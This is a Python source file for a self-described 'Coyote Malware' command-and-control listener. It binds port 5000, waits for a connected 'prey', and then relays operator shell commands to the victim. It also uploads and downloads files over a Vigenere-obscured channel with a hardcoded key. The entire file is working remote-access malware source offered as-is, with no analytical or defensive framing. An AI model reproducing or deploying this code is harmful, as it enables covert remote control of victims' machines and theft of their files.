#-*-coding: utf-8-*-
from socket import socket, AF_INET, SOCK_STREAM
from crypt import Vigenere as v
from optparse import OptionParser as op
from threading import Thread 
from time import sleep
from os import system
from sys import argv

class Coyote:
    def __init__(self, port, key, defaulthearing=True, printing=True):
        if(printing):
            print("Starting Coyote Malware...");
        self.conn = 0;
        self.v = v(key);
        self.sock = socket(AF_INET, SOCK_STREAM);
        self.sock.bind(('0.0.0.0', port));
        self.sock.listen(1);
        self.hearing = True;
        if(defaulthearing):
            if(printing):
                print("Waiting for prey");
            self.conn, addr = self.sock.accept();
            self.conn.settimeout(0.0);
            if(printing):
                print("They prey has connected");
    def shell(self):
        print("Hearing prey.");
        ears = Thread(target=self.hear_prey);
        ears.daemon = True;
        ears.start();
        cmd = "";
        while cmd != "exit":
            cmd = input(">>>");
            if(cmd[:3] == "get"):
                self.getFile(cmd[4:]);
            elif(cmd[:4] == "send"):
                self.sendFile(cmd[5:]);
            elif cmd == "cls":
                system("cls");
            else:
                self.send(cmd);
        self.conn.close();

    def hear_prey(self):
        while(self.hearing):
            msj = self.recv(b=2048, prnt=False);
            if(msj == 0):
                continue;
            if(msj[:2] == "**"):
                self.getFile(msj[:3]);
            else:
                print(msj);
                print("\n>>>");



    def send(self, msj, encrypt=True, prnt=False):
        if(encrypt):
            msj = self.v.encrypt(msj);
        if(prnt):
            print(msj);
        if(type(msj) != type(b"byte")):
            msj = str(msj).encode();
        self.conn.send(msj);
    def getFile(self, file):
        with open(file, "wb") as f:
            try:
                self.conn.settimeout(10);
                content = self.recv(decode=False, decrypt=True, b=10240);
            except Exception as e:
                print(e);
            else:
                f.write(content);
            finally:
                self.conn.settimeout(0.0);

    def sendFile(self, file):
        try:
            with open(file,"rb") as f:
                content = f.read(1024);
        except FileNotFoundError:
            print("File not found.");
        else:
            self.send(content, encrypt=True);
    def recv(self, prnt = True, decode = True, decrypt = True, b=1024):
        try:
            msj = self.conn.recv(b);
        except:
            return 0;
        else:
            if(decrypt):
                msj = self.v.decrypt(msj.decode()).encode();
            if(decode):
                msj = msj.decode();
            if(prnt):
                print(msj);
            return msj;



def main():
    c = Coyote(5000,"eajlkwbcpqynvhigdrzotusfmx");
    c.shell();

if __name__ == '__main__':
    main()

